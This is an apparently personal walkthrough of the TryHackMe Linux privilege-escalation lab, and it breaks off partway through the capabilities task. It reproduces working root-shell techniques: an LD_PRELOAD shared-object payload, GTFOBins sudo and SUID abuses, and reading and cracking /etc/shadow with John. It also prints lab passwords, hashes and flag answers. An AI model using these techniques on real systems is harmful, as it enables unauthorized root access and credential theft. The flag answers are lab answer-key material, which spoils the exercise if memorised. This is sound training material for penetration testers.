# Try Hack Me - Linux PrivEsc
##### Learn the fundamentals of Linux privilege escalation. From enumeration to exploitation, get hands-on with over 8 different privilege escalation techniques.

## Task 1 - Introduction 

Privilege escalation is a journey. There are no silver bullets, and much depends on the specific configuration of the target system. The kernel version, installed applications, supported programming languages, other users' passwords are a few key elements that will affect your road to the root shell.

This room was designed to cover the main privilege escalation vectors and give you a better understanding of the process. This new skill will be an essential part of your arsenal whether you are participating in CTFs, taking certification exams, or working as a penetration tester.
```
Read the above.
> No answer needed
```

## Task 2 - What is Privilege Escalation? 

##### What does "privilege escalation" mean?
At it's core, Privilege Escalation usually involves going from a lower permission account to a higher permission one. More technically, it's the exploitation of a vulnerability, design flaw, or configuration oversight in an operating system or application to gain unauthorized access to resources that are usually restricted from the users.

##### Why is it important?
It's rare when performing a real-world penetration test to be able to gain a foothold (initial access) that gives you direct administrative access. Privilege escalation is crucial because it lets you gain system administrator levels of access, which allows you to perform actions such as:
* Resetting passwords
* Bypassing access controls to compromise protected data
* Editing software configurations
* Enabling persistence
* Changing the privilege of existing (or new) users
* Execute any administrative command
```
Read the above.
> No answer needed
```

## Task 3 - Enumeration 

Note: Launch the target machine attached to this task to follow along.
You can launch the target machine and access it directly from your browser.
Alternatively, you can access it over SSH with the low-privilege user credentials below:

* Username: karen
* Password: Password1

Enumeration is the first step you have to take once you gain access to any system. You may have accessed the system by exploiting a critical vulnerability that resulted in root-level access or just found a way to send commands using a low privileged account. Penetration testing engagements, unlike CTF machines, don't end once you gain access to a specific system or user privilege level. As you will see, enumeration is as important during the post-compromise phase as it is before.

##### hostname
The ```hostname``` command will return the hostname of the target machine. Although this value can easily be changed or have a relatively meaningless string (e.g. Ubuntu-3487340239), in some cases, it can provide information about the target system’s role within the corporate network (e.g. SQL-PROD-01 for a production SQL server).

##### uname -a
Will print system information giving us additional detail about the kernel used by the system. This will be useful when searching for any potential kernel vulnerabilities that could lead to privilege escalation.

##### /proc/version
The proc filesystem (procfs) provides information about the target system processes. You will find proc on many different Linux flavours, making it an essential tool to have in your arsenal.
Looking at ```/proc/version``` may give you information on the kernel version and additional data such as whether a compiler (e.g. GCC) is installed.

##### /etc/issue
Systems can also be identified by looking at the ```/etc/issue``` file. This file usually contains some information about the operating system but can easily be customized or changes. While on the subject, any file containing system information can be customized or changed. For a clearer understanding of the system, it is always good to look at all of these.

##### ps Command
The ```ps``` command is an effective way to see the running processes on a Linux system. Typing ps on your terminal will show processes for the current shell.

The output of the ```ps``` (Process Status) will show the following;
* PID: The process ID (unique to the process)
* TTY: Terminal type used by the user
* Time: Amount of CPU time used by the process (this is NOT the time this process has been running for)
* CMD: The command or executable running (will NOT display any command line parameter)

The “ps” command provides a few useful options.
* ```ps -A```: View all running processes
* ```ps axjf```: View process tree (see the tree formation until ```ps axjf``` is run below)
![](https://i.imgur.com/xsbohSd.png)
* ```ps aux```: The ```aux``` option will show processes for all users (a), display the user that launched the process (u), and show processes that are not attached to a terminal (x). Looking at the ps aux command output, we can have a better understanding of the system and potential vulnerabilities.

##### env
The ```env``` command will show environmental variables.
![](https://i.imgur.com/LWdJ8Fw.png)

The PATH variable may have a compiler or a scripting language (e.g. Python) that could be used to run code on the target system or leveraged for privilege escalation.

##### sudo -l
The target system may be configured to allow users to run some (or all) commands with root privileges. The ```sudo -l``` command can be used to list all commands your user can run using ```sudo```.

##### ls
One of the common commands used in Linux is probably ```ls```.

While looking for potential privilege escalation vectors, please remember to always use the ```ls``` command with the ```-la``` parameter. The example below shows how the “secret.txt” file can easily be missed using the ```ls``` or ```ls -l``` commands.
![](https://i.imgur.com/2jOtOat.png)

##### Id
The ```id``` command will provide a general overview of the user’s privilege level and group memberships.

It is worth remembering that the ```id``` command can also be used to obtain the same information for another user as seen below.
![](https://i.imgur.com/YzfJliG.png)

##### /etc/passwd
Reading the ```/etc/passwd``` file can be an easy way to discover users on the system.
![](https://i.imgur.com/r6oYOEi.png)

While the output can be long and a bit intimidating, it can easily be cut and converted to a useful list for brute-force attacks.
![](https://i.imgur.com/cpS2U93.png)

Remember that this will return all users, some of which are system or service users that would not be very useful. Another approach could be to grep for “home” as real users will most likely have their folders under the “home” directory.
![](https://i.imgur.com/psxE6V4.png)

##### history
Looking at earlier commands with the ```history``` command can give us some idea about the target system and, albeit rarely, have stored information such as passwords or usernames.

##### ifconfig
The target system may be a pivoting point to another network. The ```ifconfig``` command will give us information about the network interfaces of the system. The example below shows the target system has three interfaces (eth0, tun0, and tun1). Our attacking machine can reach the eth0 interface but can not directly access the two other networks.
![](https://i.imgur.com/hcdZnwK.png)

This can be confirmed using the ```ip route``` command to see which network routes exist.

##### netstat
Following an initial check for existing interfaces and network routes, it is worth looking into existing communications. The ```netstat``` command can be used with several different options to gather information on existing connections.

* ```netstat -a```: shows all listening ports and established connections.
* ```netstat -at``` or ```netstat -au``` can also be used to list TCP or UDP protocols respectively.
* ```netstat -l```: list ports in “listening” mode. These ports are open and ready to accept incoming connections. This can be used with the “t” option to list only ports that are listening using the TCP protocol (below)
![](https://i.imgur.com/BbLdyrr.png)
* ```netstat -s```: list network usage statistics by protocol (below) This can also be used with the ```-t``` or ```-u``` options to limit the output to a specific protocol.
![](https://i.imgur.com/mc8OWP0.png)
* ```netstat -tp```: list connections with the service name and PID information.
![](https://i.imgur.com/fDYQwbW.png)

This can also be used with the ```-l``` option to list listening ports (below)
![](https://i.imgur.com/JK7DNv0.png)

We can see the “PID/Program name” column is empty as this process is owned by another user.
Below is the same command run with root privileges and reveals this information as 2641/nc (netcat)
![](https://i.imgur.com/FjZHqlY.png)

* ```netstat -i```: Shows interface statistics. We see below that “eth0” and “tun0” are more active than “tun1”.
![](https://i.imgur.com/r6IjpmZ.png)

The ```netstat``` usage you will probably see most often in blog posts, write-ups, and courses is ```netstat -ano``` which could be broken down as follows;
* ```-a```: Display all sockets
* ```-n```: Do not resolve names
* ```-o```: Display timers
![](https://i.imgur.com/UxzLBRw.png)

##### find Command
Searching the target system for important information and potential privilege escalation vectors can be fruitful. The built-in “find” command is useful and worth keeping in your arsenal.

Below are some useful examples for the “find” command.

**Find files:**
* ```find . -name flag1.txt```: find the file named “flag1.txt” in the current directory
* ```find /home -name flag1.txt```: find the file names “flag1.txt” in the /home directory
* ```find / -type d -name config```: find the directory named config under “/”
* ```find / -type f -perm 0777```: find files with the 777 permissions (files readable, writable, and executable by all users)
* ```find / -perm a=x```: find executable files
* ```find /home -user frank```: find all files for user “frank” under “/home”
* ```find / -mtime 10```: find files that were modified in the last 10 days
* ```find / -atime 10```: find files that were accessed in the last 10 day
* ```find / -cmin -60```: find files changed within the last hour (60 minutes)
* ```find / -amin -60```: find files accesses within the last hour (60 minutes)
* ```find / -size 50M```: find files with a 50 MB size

This command can also be used with (+) and (-) signs to specify a file that is larger or smaller than the given size.
![](https://i.imgur.com/pSMfoz4.png)

The example above returns files that are larger than 100 MB. It is important to note that the “find” command tends to generate errors which sometimes makes the output hard to read. This is why it would be wise to use the “find” command with “-type f 2>/dev/null” to redirect errors to “/dev/null” and have a cleaner output (below).
![](https://i.imgur.com/UKYSdE3.png)

Folders and files that can be written to or executed from:
* ```find / -writable -type d 2>/dev/null```: Find world-writeable folders
* ```find / -perm -222 -type d 2>/dev/null```: Find world-writeable folders
* ```find / -perm -o w -type d 2>/dev/null```: Find world-writeable folders

The reason we see three different “find” commands that could potentially lead to the same result can be seen in the manual document. As you can see below, the perm parameter affects the way “find” works.
![](https://i.imgur.com/qb0klHH.png)

* ```find / -perm -o x -type d 2>/dev/null```: Find world-executable folders

Find development tools and supported languages:
* ```find / -name perl*```
* ```find / -name python*```
* ```find / -name gcc*```

Find specific file permissions:

Below is a short example used to find files that have the SUID bit set. The SUID bit allows the file to run with the privilege level of the account that owns it, rather than the account which runs it. This allows for an interesting privilege escalation path,we will see in more details on task 6. The example below is given to complete the subject on the “find” command.
* ```find / -perm -u=s -type f 2>/dev/null```: Find files with the SUID bit, which allows us to run the file with a higher privilege level than the current user.

##### General Linux Commands
As we are in the Linux realm, familiarity with Linux commands, in general, will be very useful. Please spend some time getting comfortable with commands such as ```find```, ```locate```, ```grep```, ```cut```, ```sort```, etc.

```bash
hostname
wade7363

uname -a
Linux wade7363 3.13.0-24-generic #46-Ubuntu SMP Thu Apr 10 19:11:08 UTC 
2014 x86_64 x86_64 x86_64 GNU/Linux

cat /proc/version
Linux version 3.13.0-24-generic (buildd@panlong) (gcc version 4.8.2 (Ubu
ntu 4.8.2-19ubuntu1) ) #46-Ubuntu SMP Thu Apr 10 19:11:08 UTC 2014

cat /etc/issue
Ubuntu 14.04 LTS \n \l

python
Python 2.7.6 (default, Mar 22 2014, 22:59:56)

# Search exploit-db.com for 3.13.0
CVE-2015-1328
```

```
What is the hostname of the target system?
> wade7363
```

```
What is the Linux kernel version of the target system?
> 3.13.0-24-generic
```

```
What Linux is this?
> Ubuntu 14.04 LTS
```

```
What version of the Python language is installed on the system?
> 2.7.6
```

```
What vulnerability seem to affect the kernel of the target system? (Enter a CVE number)
> CVE-2015-1328
```

## Task 4 - Automated Enumeration Tools 

Several tools can help you save time during the enumeration process. These tools should only be used to save time knowing they may miss some privilege escalation vectors. Below is a list of popular Linux enumeration tools with links to their respective Github repositories.
The target system’s environment will influence the tool you will be able to use. For example, you will not be able to run a tool written in Python if it is not installed on the target system. This is why it would be better to be familiar with a few rather than having a single go-to tool.
* **LinPeas**: https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS
* **LinEnum**: https://github.com/rebootuser/LinEnum
* **LES (Linux Exploit Suggester)**: https://github.com/mzet-/linux-exploit-suggester
* **Linux Smart Enumeration**: https://github.com/diego-treitos/linux-smart-enumeration
* **Linux Priv Checker**: https://github.com/linted/linuxprivchecker
```
Install and try a few automated enumeration tools on your local Linux distribution
> No answer needed
```

## Task 5 - Privilege Escalation: Kernel Exploits 

Note: Launch the target machine attached to this task to follow along.
You can launch the target machine and access it directly from your browser.
Alternatively, you can access it over SSH with the low-privilege user credentials below:

* Username: karen
* Password: Password1

Privilege escalation ideally leads to root privileges. This can sometimes be achieved simply by exploiting an existing vulnerability, or in some cases by accessing another user account that has more privileges, information, or access.

Unless a single vulnerability leads to a root shell, the privilege escalation process will rely on misconfigurations and lax permissions.

The kernel on Linux systems manages the communication between components such as the memory on the system and applications. This critical function requires the kernel to have specific privileges; thus, a successful exploit will potentially lead to root privileges.

The Kernel exploit methodology is simple;
1. Identify the kernel version
2. Search and find an exploit code for the kernel version of the target system
3. Run the exploit

Although it looks simple, please remember that a failed kernel exploit can lead to a system crash. Make sure this potential outcome is acceptable within the scope of your penetration testing engagement before attempting a kernel exploit.

**Research sources:**
1. Based on your findings, you can use Google to search for an existing exploit code.
2. Sources such as https://www.linuxkernelcves.com/cves can also be useful.
3. Another alternative would be to use a script like LES (Linux Exploit Suggester) but remember that these tools can generate false positives (report a kernel vulnerability that does not affect the target system) or false negatives (not report any kernel vulnerabilities although the kernel is vulnerable).

**Hints/Notes:**
1. Being too specific about the kernel version when searching for exploits on Google, Exploit-db, or searchsploit
2. Be sure you understand how the exploit code works BEFORE you launch it. Some exploit codes can make changes on the operating system that would make them unsecured in further use or make irreversible changes to the system, creating problems later. Of course, these may not be great concerns within a lab or CTF environment, but these are absolute no-nos during a real penetration testing engagement.
3. Some exploits may require further interaction once they are run. Read all comments and instructions provided with the exploit code.
4. You can transfer the exploit code from your machine to the target system using the ```SimpleHTTPServer``` Python module and ```wget``` respectively.

```bash
uname -a
Linux wade7363 3.13.0-24-generic #46-Ubuntu SMP Thu Apr 10 19:11:08 UTC 2014 x86_64 x86_64 x86_64 GNU/Linux

cd /dev/shm
nano ofs.c
gcc ofs.c -o ofs
chmod +x ofs
./ofs
whoami
root

find / -name flag1.txt 2>/dev/null
/home/matt/flag1.txt

cat /home/matt/flag1.txt
THM-28392872729920
```

```
find and use the appropriate kernel exploit to gain root privileges on the target system.
> No answer needed
```

```
What is the content of the flag1.txt file?
> THM-28392872729920
```

## Task 6 - Privilege Escalation: Sudo 

Note: Launch the target machine attached to this task to follow along.
You can launch the target machine and access it directly from your browser.
Alternatively, you can access it over SSH with the low-privilege user credentials below:

* Username: karen
* Password: Password1

The sudo command, by default, allows you to run a program with root privileges. Under some conditions, system administrators may need to give regular users some flexibility on their privileges. For example, a junior SOC analyst may need to use Nmap regularly but would not be cleared for full root access. In this situation, the system administrator can allow this user to only run Nmap with root privileges while keeping its regular privilege level throughout the rest of the system.

Any user can check its current situation related to root privileges using the ```sudo -l``` command.

https://gtfobins.github.io/ is a valuable source that provides information on how any program, on which you may have sudo rights, can be used.

##### Leverage application functions

Some applications will not have a known exploit within this context. Such an application you may see is the Apache2 server.

In this case, we can use a "hack" to leak information leveraging a function of the application. As you can see below, Apache2 has an option that supports loading alternative configuration files ( -f : specify an alternate ServerConfigFile).
![](https://i.imgur.com/rNpbbL8.png)

Loading the ```/etc/shadow``` file using this option will result in an error message that includes the first line of the ```/etc/shadow``` file.

##### Leverage LD_PRELOAD
On some systems, you may see the LD_PRELOAD environment option.
![](https://i.imgur.com/gGstS69.png)

LD_PRELOAD is a function that allows any program to use shared libraries. This [blog post](https://rafalcieslak.wordpress.com/2013/04/02/dynamic-linker-tricks-using-ld_preload-to-cheat-inject-features-and-investigate-programs/) will give you an idea about the capabilities of LD_PRELOAD. If the "env_keep" option is enabled we can generate a shared library which will be loaded and executed before the program is run. Please note the LD_PRELOAD option will be ignored if the real user ID is different from the effective user ID.

The steps of this privilege escalation vector can be summarized as follows;
1. Check for LD_PRELOAD (with the env_keep option)
2. Write a simple C code compiled as a share object (.so extension) file
3. Run the program with sudo rights and the LD_PRELOAD option pointing to our .so file

The C code will simply spawn a root shell and can be written as follows;
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```

We can save this code as shell.c and compile it using gcc into a shared object file using the following parameters;
```bash
gcc -fPIC -shared -o shell.so shell.c -nostartfiles
```
![](https://i.imgur.com/HxbszMW.png)

We can now use this shared object file when launching any program our user can run with sudo. In our case, Apache2, find, or almost any of the programs we can run with sudo can be used.

We need to run the program by specifying the LD_PRELOAD option, as follows;
```bash
sudo LD_PRELOAD=/home/user/ldpreload/shell.so find
```
This will result in a shell spawn with root privileges.
![](https://i.imgur.com/1YwARyZ.png)

##### Enumerate
```bash
sudo -l
Matching Defaults entries for karen on ip-10-10-124-117:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User karen may run the following commands on ip-10-10-124-117:
    (ALL) NOPASSWD: /usr/bin/find
    (ALL) NOPASSWD: /usr/bin/less
    (ALL) NOPASSWD: /usr/bin/nano
```

##### GTFObins
```bash
find 	    Shell SUID Sudo 
less 	    Shell File write File read SUID Sudo 
nano 	    Shell File write File read Sudo Limited SUID 

sudo find . -exec /bin/sh \; -quit
whoami
root

cd /home
ls
cd ubuntu
ls
cat flag2.txt
THM-402028394


sudo nmap --interactive


cat /etc/shadow
frank:$6$2.sUUDsOLIpXKxcr$eImtgFExyr2ls4jsghdD3DHLHHP9X50Iv.jNmwo/BJpphrPRJWjelWEz2HH.joV14aDEwW1c3CahzB1uaqeLR1:18796:0:99999:7:::

```

```
How many programs can the user "karen" run on the target system with sudo rights?
> 3
```

```
What is the content of the flag2.txt file?
> THM-402028394
```

```
How would you use Nmap to spawn a root shell if your user had sudo rights on nmap?
> sudo nmap --interactive
```

```
What is the hash of frank's password?
> $6$2.sUUDsOLIpXKxcr$eImtgFExyr2ls4jsghdD3DHLHHP9X50Iv.jNmwo/BJpphrPRJWjelWEz2HH.joV14aDEwW1c3CahzB1uaqeLR1
```

## Task 7 - Privilege Escalation: SUID 

Note: Launch the target machine attached to this task to follow along.
You can launch the target machine and access it directly from your browser.
Alternatively, you can access it over SSH with the low-privilege user credentials below:

* Username: karen
* Password: Password1

Much of Linux privilege controls rely on controlling the users and files interactions. This is done with permissions. By now, you know that files can have read, write, and execute permissions. These are given to users within their privilege levels. This changes with SUID (Set-user Identification) and SGID (Set-group Identification). These allow files to be executed with the permission level of the file owner or the group owner, respectively.

You will notice these files have an “s” bit set showing their special permission level.

```find / -type f -perm -04000 -ls 2>/dev/null``` will list files that have SUID or SGID bits set.
![](https://i.imgur.com/fJEeZ4m.png)

A good practice would be to compare executables on this list with GTFOBins (https://gtfobins.github.io). Clicking on the SUID button will filter binaries known to be exploitable when the SUID bit is set (you can also use this link for a pre-filtered list https://gtfobins.github.io/#+suid).

The list above shows that nano has the SUID bit set. Unfortunately, GTFObins does not provide us with an easy win. Typical to real-life privilege escalation scenarios, we will need to find intermediate steps that will help us leverage whatever minuscule finding we have.

![](https://i.imgur.com/rSRTn5v.png)

The SUID bit set for the nano text editor allows us to create, edit and read files using the file owner’s privilege. Nano is owned by root, which probably means that we can read and edit files at a higher privilege level than our current user has. At this stage, we have two basic options for privilege escalation: reading the ```/etc/shadow``` file or adding our user to ```/etc/passwd```.

Below are simple steps using both vectors.

reading the ```/etc/shadow``` file

We see that the nano text editor has the SUID bit set by running the ```find / -type f -perm -04000 -ls 2>/dev/null``` command.

```nano /etc/shadow``` will print the contents of the ```/etc/shadow``` file. We can now use the unshadow tool to create a file crackable by John the Ripper. To achieve this, unshadow needs both the ```/etc/shadow``` and ```/etc/passwd``` files.
![](https://i.imgur.com/DAWxbJD.png)

The unshadow tool’s usage can be seen below;
```unshadow passwd.txt shadow.txt > passwords.txt```

![](https://i.imgur.com/6cHBAr1.png)

With the correct wordlist and a little luck, John the Ripper can return one or several passwords in cleartext. For a more detailed room on John the Ripper, you can visit https://tryhackme.com/room/johntheripper0

The other option would be to add a new user that has root privileges. This would help us circumvent the tedious process of password cracking. Below is an easy way to do it:

We will need the hash value of the password we want the new user to have. This can be done quickly using the openssl tool on Kali Linux.
![](https://i.imgur.com/bkOGaHY.png)

We will then add this password with a username to the ```/etc/passwd``` file.
![](https://i.imgur.com/huGoEtj.png)

Once our user is added (please note how ```root:/bin/bash``` was used to provide a root shell) we will need to switch to this user and hopefully should have root privileges.
![](https://i.imgur.com/HZcWGhi.png)

##### Check for SUID/SGID
```bash
find / -type f -perm -04000 -ls 2>/dev/null
       66     40 -rwsr-xr-x   1 root     root        40152 Jan 27  2020 /snap/core/10185/bin/mount
       80     44 -rwsr-xr-x   1 root     root        44168 May  7  2014 /snap/core/10185/bin/ping
       81     44 -rwsr-xr-x   1 root     root        44680 May  7  2014 /snap/core/10185/bin/ping6
       98     40 -rwsr-xr-x   1 root     root        40128 Mar 25  2019 /snap/core/10185/bin/su
      116     27 -rwsr-xr-x   1 root     root        27608 Jan 27  2020 /snap/core/10185/bin/umount
     2610     71 -rwsr-xr-x   1 root     root        71824 Mar 25  2019 /snap/core/10185/usr/bin/chfn
     2612     40 -rwsr-xr-x   1 root     root        40432 Mar 25  2019 /snap/core/10185/usr/bin/chsh
     2689     74 -rwsr-xr-x   1 root     root        75304 Mar 25  2019 /snap/core/10185/usr/bin/gpasswd
     2781     39 -rwsr-xr-x   1 root     root        39904 Mar 25  2019 /snap/core/10185/usr/bin/newgrp
     2794     53 -rwsr-xr-x   1 root     root        54256 Mar 25  2019 /snap/core/10185/usr/bin/passwd
     2904    134 -rwsr-xr-x   1 root     root       136808 Jan 31  2020 /snap/core/10185/usr/bin/sudo
     3003     42 -rwsr-xr--   1 root     systemd-resolve    42992 Jun 11  2020 /snap/core/10185/usr/lib/dbus-1.0/dbus-daemon-launch-helper
     3375    419 -rwsr-xr-x   1 root     root              428240 May 26  2020 /snap/core/10185/usr/lib/openssh/ssh-keysign
     6437    109 -rwsr-xr-x   1 root     root              110792 Oct  8  2020 /snap/core/10185/usr/lib/snapd/snap-confine
     7615    386 -rwsr-xr--   1 root     dip               394984 Jul 23  2020 /snap/core/10185/usr/sbin/pppd
       56     43 -rwsr-xr-x   1 root     root               43088 Mar  5  2020 /snap/core18/1885/bin/mount
       65     63 -rwsr-xr-x   1 root     root               64424 Jun 28  2019 /snap/core18/1885/bin/ping
       81     44 -rwsr-xr-x   1 root     root               44664 Mar 22  2019 /snap/core18/1885/bin/su
       99     27 -rwsr-xr-x   1 root     root               26696 Mar  5  2020 /snap/core18/1885/bin/umount
     1698     75 -rwsr-xr-x   1 root     root               76496 Mar 22  2019 /snap/core18/1885/usr/bin/chfn
     1700     44 -rwsr-xr-x   1 root     root               44528 Mar 22  2019 /snap/core18/1885/usr/bin/chsh
     1752     75 -rwsr-xr-x   1 root     root               75824 Mar 22  2019 /snap/core18/1885/usr/bin/gpasswd
     1816     40 -rwsr-xr-x   1 root     root               40344 Mar 22  2019 /snap/core18/1885/usr/bin/newgrp
     1828     59 -rwsr-xr-x   1 root     root               59640 Mar 22  2019 /snap/core18/1885/usr/bin/passwd
     1919    146 -rwsr-xr-x   1 root     root              149080 Jan 31  2020 /snap/core18/1885/usr/bin/sudo
     2006     42 -rwsr-xr--   1 root     systemd-resolve    42992 Jun 11  2020 /snap/core18/1885/usr/lib/dbus-1.0/dbus-daemon-launch-helper
     2314    427 -rwsr-xr-x   1 root     root              436552 Mar  4  2019 /snap/core18/1885/usr/lib/openssh/ssh-keysign
     7477     52 -rwsr-xr--   1 root     messagebus         51344 Jun 11  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
    13816    464 -rwsr-xr-x   1 root     root              473576 May 29  2020 /usr/lib/openssh/ssh-keysign
    13661     24 -rwsr-xr-x   1 root     root               22840 Aug 16  2019 /usr/lib/policykit-1/polkit-agent-helper-1
     7479     16 -rwsr-xr-x   1 root     root               14488 Jul  8  2019 /usr/lib/eject/dmcrypt-get-device
    13676    128 -rwsr-xr-x   1 root     root              130152 Oct  8  2020 /usr/lib/snapd/snap-confine
     1856     84 -rwsr-xr-x   1 root     root               85064 May 28  2020 /usr/bin/chfn
     2300     32 -rwsr-xr-x   1 root     root               31032 Aug 16  2019 /usr/bin/pkexec
     1816    164 -rwsr-xr-x   1 root     root              166056 Jul 15  2020 /usr/bin/sudo
     1634     40 -rwsr-xr-x   1 root     root               39144 Jul 21  2020 /usr/bin/umount
     1860     68 -rwsr-xr-x   1 root     root               68208 May 28  2020 /usr/bin/passwd
     1859     88 -rwsr-xr-x   1 root     root               88464 May 28  2020 /usr/bin/gpasswd
     1507     44 -rwsr-xr-x   1 root     root               44784 May 28  2020 /usr/bin/newgrp
     1857     52 -rwsr-xr-x   1 root     root               53040 May 28  2020 /usr/bin/chsh
     1722     44 -rwsr-xr-x   1 root     root               43352 Sep  5  2019 /usr/bin/base64
     1674     68 -rwsr-xr-x   1 root     root               67816 Jul 21  2020 /usr/bin/su
     2028     40 -rwsr-xr-x   1 root     root               39144 Mar  7  2020 /usr/bin/fusermount
     2166     56 -rwsr-sr-x   1 daemon   daemon             55560 Nov 12  2018 /usr/bin/at
     1633     56 -rwsr-xr-x   1 root     root               55528 Jul 21  2020 /usr/bin/mount
```

##### Check GTFObins
```bash
# Found base64
base64 /etc/passwd | base64 --decode

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
landscape:x:110:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:111:1::/var/cache/pollinate:/bin/false
ec2-instance-connect:x:112:65534::/nonexistent:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
gerryconway:x:1001:1001::/home/gerryconway:/bin/sh
user2:x:1002:1002::/home/user2:/bin/sh
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
karen:x:1003:1003::/home/karen:/bin/sh

base64 /etc/shadow | base64 --decode

root:*:18561:0:99999:7:::
daemon:*:18561:0:99999:7:::
bin:*:18561:0:99999:7:::
sys:*:18561:0:99999:7:::
sync:*:18561:0:99999:7:::
games:*:18561:0:99999:7:::
man:*:18561:0:99999:7:::
lp:*:18561:0:99999:7:::
mail:*:18561:0:99999:7:::
news:*:18561:0:99999:7:::
uucp:*:18561:0:99999:7:::
proxy:*:18561:0:99999:7:::
www-data:*:18561:0:99999:7:::
backup:*:18561:0:99999:7:::
list:*:18561:0:99999:7:::
irc:*:18561:0:99999:7:::
gnats:*:18561:0:99999:7:::
nobody:*:18561:0:99999:7:::
systemd-network:*:18561:0:99999:7:::
systemd-resolve:*:18561:0:99999:7:::
systemd-timesync:*:18561:0:99999:7:::
messagebus:*:18561:0:99999:7:::
syslog:*:18561:0:99999:7:::
_apt:*:18561:0:99999:7:::
tss:*:18561:0:99999:7:::
uuidd:*:18561:0:99999:7:::
tcpdump:*:18561:0:99999:7:::
sshd:*:18561:0:99999:7:::
landscape:*:18561:0:99999:7:::
pollinate:*:18561:0:99999:7:::
ec2-instance-connect:!:18561:0:99999:7:::
systemd-coredump:!!:18796::::::
ubuntu:!:18796:0:99999:7:::
gerryconway:$6$vgzgxM3ybTlB.wkV$48YDY7qQnp4purOJ19mxfMOwKt.H2LaWKPu0zKlWKaUMG1N7weVzqobp65RxlMIZ/NirxeZdOJMEOp3ofE.RT/:18796:0:99999:7:::
user2:$6$m6VmzKTbzCD/.I10$cKOvZZ8/rsYwHd.pE099ZRwM686p/Ep13h7pFMBCG4t7IukRqc/fXlA1gHXh9F2CbwmD4Epi1Wgh.Cl.VV1mb/:18796:0:99999:7:::
lxd:!:18796::::::
karen:$6$VjcrKz/6S8rhV4I7$yboTb0MExqpMXW0hjEJgqLWs/jGPJA7N/fEoPMuYLY1w16FwL7ECCbQWJqYLGpy.Zscna9GILCSaNLJdBP1p8/:18796:0:99999:7:::
```

##### Crack passwords
```bash
nano passwd.txt
nano shadow.txt
unshadow passwd.txt shadow.txt > passwords.txt

john --wordlist=/usr/share/wordlists/rockyou.txt passwords.txt
Password1        (karen)
Password1        (user2)
test123          (gerryconway)
```

##### Find flag3.txt
```bash
find / -name flag3.txt 2>/dev/null
/home/ubuntu/flag3.txt

cat /home/ubuntu/flag3.txt
cat: /home/ubuntu/flag3.txt: Permission denied

ls -la /home/ubuntu/flag3.txt
-rwx------ 1 root root 12 Jun 18 11:05 /home/ubuntu/flag3.txt

base64 /home/ubuntu/flag3.txt | base64 --decode
THM-3847834
```


```
Which user shares the name of a great comic book writer?
> gerryconway
```

```
What is the password of user2?
> Password1
```

```
What is the content of the flag3.txt file?
> THM-3847834
```

## Task 8 - Privilege Escalation: Capabilities 

Note: Launch the target machine attached to this task to follow along.
You can launch the target machine and access it directly from your browser.
Alternatively, you can access it over SSH with the low-privilege user credentials below:

* Username: karen
* Password: Password1

Another method system administrators can use to increase the privilege level of a process or binary is “Capabilities”. Capabilities help manage privileges at a more granular level. For example, if the SOC analyst needs to use a tool that needs to initiate socket connections, a regular user would not be able to do that. If the system administrator does not want to give this user higher privileges, they can change the capabilities of the binary. As a result, the binary would get through its task without needing a higher privilege user.
The capabilities man page provides detailed information on its usage and options.

We can use the ```getcap``` tool to list enabled capabilities.
![](https://i.imgur.com/Q6XYr0p.png)

When run as an unprivileged user, ```getcap -r /``` will generate a huge amount of errors, so it is good practice to redirect the error messages to /dev/null.

Please note that neither vim nor its copy has the SUID bit set. This privilege escalation vector is therefore not discoverable when enumerating files looking for SUID.
![](https://i.imgur.com/6csoabB.png)

GTFObins has a good list of binaries that can be leveraged for privilege escalation if we find any set capabilities.

We notice that vim can be used with the following command and payload:
![](https://i.imgur.com/nlpCMWj.png)

This will launch a root shell as seen below;
![](https://i.imgur.com/jCjvgo3.png)

##### Check Capabilities.
```bash
getcap -r / 2>/dev/null

/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/bin/ping = cap_net_raw+ep
/home/karen/vim = cap_setuid+ep
/home/ubuntu/view = cap_setuid+ep
```

##### Escalate Privileges.
```bash
